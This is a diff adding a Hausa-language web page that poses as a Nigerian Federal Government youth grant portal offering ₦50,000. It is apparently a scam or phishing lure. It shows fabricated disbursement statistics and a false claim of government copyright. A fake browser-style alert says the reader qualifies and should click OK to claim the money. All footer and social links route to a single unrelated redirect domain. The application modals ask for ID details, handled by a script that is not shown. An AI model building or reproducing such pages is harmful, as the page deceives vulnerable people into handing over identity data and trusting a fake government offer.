@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="ha">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shirin Tallafin ICD 2025 | Gwamnatin Tarayya ta Najeriya</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="icon" href="assets/img/FMYD-Fav-Icon-300x300.png">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body>
+    <header>
+    <div class="hamburger" id="hamburger-btn">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+    <h3 style="color: white; font-weight: 800; text-shadow: 0 2px 4px rgba(0,0,0,0.5);">ICD</h3>
+    <div class="logos">
+        <img src="assets/img/1000268102.png" alt="">
+    </div>
+</header>
+
+<div class="mobile-menu-overlay" id="mobile-menu">
+    <ul class="mobile-links">
+        <li><a href="#">Gida</a></li>
+        <li><a href="#">Bayanin Tallafin</a></li>
+        <li><a href="#">Taimakon Tuntuɓi</a></li>
+    </ul>
+    <a href="#" onclick="toggleMenu(); openStartApp(); return false;" class="mobile-login-btn">Fara Nema</a>
+</div>
+
+<div class="backdrop" id="menu-backdrop"></div>
+
+    <section class="hero">
+        <div class="hero-bg" id="hero-slider">
+            <img src="assets/img/314mdi37cb-b46f-59d3-80e8.webp" class="active" alt="Ƙarfafa Matasa">
+            <img src="assets/img/solution-to-unemployment-green.webp" alt="Haɓaka Kasuwanci">
+            <img src="assets/img/unemployed-youth-during-interview.png" alt="Masu Kasuwanci">
+        </div>
+        <div class="hero-overlay"></div>
+        
+        <div class="hero-content" data-aos="fade-up">
+            <h1>Ƙirƙirar Matasa & <br><span>Tallafin Haɓa Kashi 2025</span></h1>
+            <p>Yunƙuri na Gwamnatin Tarayya don rage rashin aikin yi a tsakanin matasa, haɓaka tattalin arziƙi, da kuma rage talauci ta hanyar samar da damar samun kuɗin kasuwanci da tallafin har zuwa ₦50,000.</p>
+            
+            <div class="btn-group">
+                <button onclick="openCheckStatus()" class="btn btn-login">Duba Matsayi</button>
+                <button onclick="openStartApp()" class="btn btn-primary">Fara Nema</button>
+            </div>
+        </div>
+    </section>
+
+    <div class="cookie-consent" id="cookie-popup">
+        <p>Da danna "Karɓi Duk Kukis", kun yarda da adana kukis a na'urarka don inganta kewaya shafin, bincika amfani da shafin, da taimakawa a yunƙurin tallanmu. <a href="#">Manufar Sirri</a>.</p>
+        <button class="cookie-btn" onclick="acceptCookies()">Karɓa</button>
+    </div>
+
+    <section class="features-section">
+        <div class="feature-card" data-aos="fade-up">
+            <div class="feature-num">₦</div>
+            <div class="feature-content">
+                <h3>Ƙarfafa Kuɗi</h3>
+                <p>Samun tallafin har zuwa ₦50,000 don canza ra'ayoyi zuwa gaskiya, ƙirƙirar ayyukan yi, da gina arziƙi don kanku da al'ummarku.</p>
+            </div>
+        </div>
+
+        <div class="feature-card" data-aos="fade-up" data-aos-delay="100">
+            <div class="feature-num"><i class="fas fa-chart-line" style="font-size: 1rem;"></i></div>
+            <div class="feature-content">
+                <h3>Haɓaka Kasuwanci</h3>
+                <p>Samun damar yin amfani da sabis na haɓaka kasuwanci da ƙarfafawar tattalin arziƙi da ake buƙata don canzawa zuwa ɗan kasuwa mai nasara.</p>
+            </div>
+        </div>
+
+        <div class="feature-card" data-aos="fade-up" data-aos-delay="200">
+            <div class="feature-num"><i class="fas fa-users" style="font-size: 1rem;"></i></div>
+            <div class="feature-content">
+                <h3>Haɓakar Tattalin Arziƙi</h3>
+                <p>Ba da gudunmawa ga tattalin arziƙin ƙasar ta hanyar ƙarfafa ma'aikatan matasa da rage talauci a dukan gidajen Najeriya.</p>
+            </div>
+        </div>
+    </section>
+    
+    <section class="stats-section">
+    <h2 data-aos="fade-down">Bayarwa</h2>
+    <p class="stats-desc" data-aos="fade-up">Bibiyar ci gaban bayar da Tallafin ICD a cikin batutuwa daban-daban.</p>
+
+    <!-- Batch Buttons (Control Tabs) -->
+    <div class="batch-buttons" data-aos="fade-up">
+        <button class="batch-btn active" onclick="setBatch(0)">Batch A</button>
+        <button class="batch-btn" onclick="setBatch(1)">Batch B</button>
+        <button class="batch-btn" onclick="setBatch(2)">Batch C</button>
+    </div>
+
+    <!-- Dynamic Slider Content -->
+    <div class="stats-slider-container" data-aos="zoom-in">
+        
+        <!-- Batch A Slide -->
+        <div class="stat-slide active-slide" id="slide-0">
+            <div class="counter-card">
+                <div class="stats-grid">
+                    <div class="stat-item">
+                        <h4>Jimillar Masu Nema</h4>
+                        <div class="value">1,250,400</div>
+                    </div>
+                    <div class="stat-item">
+                        <h4>Nasara</h4>
+                        <div class="value">850,000</div>
+                    </div>
+                    <div class="stat-item">
+                        <h4>Adadin da Aka Bayar</h4>
+                        <div class="value">₦42.5B</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Batch B Slide -->
+        <div class="stat-slide" id="slide-1">
+            <div class="counter-card">
+                <div class="stats-grid">
+                    <div class="stat-item">
+                        <h4>Jimillar Masu Nema</h4>
+                        <div class="value">980,200</div>
+                    </div>
+                    <div class="stat-item">
+                        <h4>Nasara</h4>
+                        <div class="value">620,000</div>
+                    </div>
+                    <div class="stat-item">
+                        <h4>Adadin da Aka Bayar</h4>
+                        <div class="value">₦31.0B</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Batch C Slide -->
+        <div class="stat-slide" id="slide-2">
+            <div class="counter-card">
+                <div class="stats-grid">
+                    <div class="stat-item">
+                        <h4>Jimillar Masu Nema</h4>
+                        <div class="value">Ana gudana</div>
+                    </div>
+                    <div class="stat-item">
+                        <h4>Nasara</h4>
+                        <div class="value">Ana aiwatarwa</div>
+                    </div>
+                    <div class="stat-item">
+                        <h4>Adadin da Aka Bayar</h4>
+                        <div class="value">Ana jiran</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Pagination Dots -->
+    <div class="pagination-dots">
+        <div class="dot active" onclick="setBatch(0)"></div>
+        <div class="dot" onclick="setBatch(1)"></div>
+        <div class="dot" onclick="setBatch(2)"></div>
+    </div>
+</section>
+
+    <section class="governor-section">
+        <div class="gov-img-wrapper" data-aos="zoom-in">
+            <div class="gov-bg-shape"></div>
+            <img src="assets/img/carousel-3.jpg" alt="Yunƙurin Gwamnatin Tarayya" class="eligibility-img" data-aos="zoom-in">
+        </div>
+        
+        <div data-aos="fade-up">
+            <h2 class="gov-name">Yunƙurin Gwamnatin Tarayya</h2>
+            <p class="gov-title">Ƙirƙirar Matasa da Haɓa Kashi</p>
+            
+            <div class="quote-block">
+                <p class="quote-text">"Wannan gwamnati ta himmantu don buɗe damar matasan Najeriya. Ta hanyar Tallafin ICD, muna samar da mai don ƙirƙira, kasuwanci, da zaman lafiya na tattalin arziƙi mai dorewa."</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="steps-section">
+        <h2 class="section-title">Sauƙaƙan <span>Matakai Masu Sauri</span> don Nema</h2>
+        <p class="steps-desc">Bi wannan tsari mai sauƙi don samun tallafinku.</p>
+
+        <div class="step-grid">
+            <div class="step-card" data-aos="fade-right">
+                <div class="step-num-icon">1</div>
+                <h4>Yi Rajista A Kan Yanar Gizo</h4>
+                <p>Ƙirƙiri bayanan aikace-aikacenku ta amfani da cikakkun bayananku, Jihar Asali, da ingantaccen shaida.</p>
+            </div>
+
+            <div class="step-card" data-aos="fade-right" data-aos-delay="100">
+                <div class="step-num-icon">2</div>
+                <h4>Zaɓi Nau'in</h4>
+                <p>Zaɓi nau'in kasuwancinku kuma ku ba da cikakkun bayanai game da yadda tallafin zai tallafa wa kasuwancinku.</p>
+            </div>
+
+            <div class="step-card" data-aos="fade-right" data-aos-delay="200">
+                <div class="step-num-icon">3</div>
+                <h4>Samu Kuɗi</h4>
+                <p>Bayan tabbatarwa da zaɓi mai nasara, za a bayar da tallafin ₦50,000 kai tsaye zuwa asusunku.</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="eligibility-section">
+        <div class="eligibility-tag">Cancanta</div>
+        <h2 style="font-size: 2rem; margin-bottom: 20px; color:#333;">Wanene Zai Iya Nema?</h2>
+
+        <div class="eligibility-container">
+            <div class="eligibility-content">
+                <ul class="eligibility-list">
+                    <li data-aos="fade-up">
+                        <div class="check-icon"><i class="fas fa-check"></i></div>
+                        <p>Dole ya zama ɗan ƙasar Najeriya tare da ingantaccen ID (NIN).</p>
+                    </li>
+                    <li data-aos="fade-up" data-aos-delay="200">
+                        <div class="check-icon"><i class="fas fa-check"></i></div>
+                        <p>Dole ya zama mazaunin Najeriya.</p>
+                    </li>
+                    <li data-aos="fade-up" data-aos-delay="100">
+                        <div class="check-icon"><i class="fas fa-check"></i></div>
+                        <p>Tsakanin shekaru 18 da 40.</p>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </section>
+    
+    <footer>
+        <nav class="footer-nav">
+            <a href="https://ey43.com/4/10246098">Gida</a>
+            <a href="https://ey43.com/4/10246098">Bayanin Tallafin</a>
+            <a href="https://ey43.com/4/10246098">Tuntuɓi</a>
+            <a href="https://ey43.com/4/10246098">Shiga</a>
+        </nav>
+
+        <div class="social-icons">
+            <a href="https://ey43.com/4/10246098" class="social-icon"><i class="fab fa-instagram"></i></a>
+            <a href="https://ey43.com/4/10246098" class="social-icon"><i class="fab fa-facebook-f"></i></a>
+            <a href="https://ey43.com/4/10246098" class="social-icon"><i class="fab fa-twitter"></i></a>
+        </div>
+
+        <div class="copyright-links">
+            <p>Sharuɗɗan Amfani | Manufar sirri</p>
+            <p style="margin-top: 10px;">&copy; 2025 Jamhuriyar Tarayyar Najeriya. Duk haƙƙoƙi suna kiyayewa.</p>
+        </div>
+    </footer>
+
+    <div id="scroll-to-top" onclick="scrollToTop()">
+        <svg width="50" height="50" viewBox="0 0 50 50">
+            <circle cx="25" cy="25" r="23" class="bg-circle"></circle>
+            <circle cx="25" cy="25" r="23" class="progress-circle" id="progress-indicator"></circle>
+        </svg>
+        <div class="arrow-up"><i class="fas fa-arrow-up"></i></div>
+    </div>
+    
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script src="assets/js/script.js" defer></script>
+    
+    <div class="backdrop" id="modal-backdrop"></div>
+
+    <div class="modal-container" id="application-modal">
+        <div class="modal-header">
+            <h3 id="modal-title">Aikace-aikace</h3>
+            <span class="close-modal" onclick="closeModal()">&times;</span>
+        </div>
+
+        <!-- Progress Tracker (Only for Start Application) -->
+        <div class="progress-track" id="progress-track">
+            <div class="step active" id="step-1-indicator">1</div>
+            <div class="step-line" id="line-1"></div>
+            <div class="step" id="step-2-indicator">2</div>
+            <div class="step-line" id="line-2"></div>
+            <div class="step" id="step-3-indicator">3</div>
+        </div>
+
+        <div class="modal-body">
+            <!-- Dynamic Content gets injected here -->
+            <div id="modal-content-area"></div>
+            
+            <!-- Loader (Hidden by default) -->
+            <div id="modal-loader" style="display: none; flex-direction: column; align-items: center; justify-content: center; padding: 40px;">
+                <div class="newtons-cradle">
+                    <div class="newtons-cradle__dot"></div>
+                    <div class="newtons-cradle__dot"></div>
+                    <div class="newtons-cradle__dot"></div>
+                    <div class="newtons-cradle__dot"></div>
+                </div>
+                <p style="margin-top: 20px; color: #666;">Ana aiwatar da Buƙatar...</p>
+            </div>
+        </div>
+    </div>
+    <!-- System Alert Popup -->
+<div class="sys-alert-overlay" id="sys-alert">
+    <div class="sys-alert-box">
+        <div class="sys-alert-domain">icd-official.com ya ce</div>
+        <div class="sys-alert-body">
+            SMS: Taya murna, kun cancanci tallafin ci gaban kuɗi na ₦50,000 daga Gwamnatin Tarayya ga 'yan ƙasa. 
+            <br><br>
+            Da fatan za a danna OK don karɓar kyautar kuɗi.
+        </div>
+        <!-- Readonly input to mimic image -->
+        <input type="text" class="sys-input-fake" value="CIRE ₦50,000" readonly>
+        
+        <div class="sys-alert-actions">
+            <div class="sys-btn-cancel" onclick="sysAlertCancel()">Soke</div>
+            <div class="sys-btn-ok" onclick="sysAlertOk()">OK</div>
+        </div>
+    </div>
+</div>
+</body>
+</html>
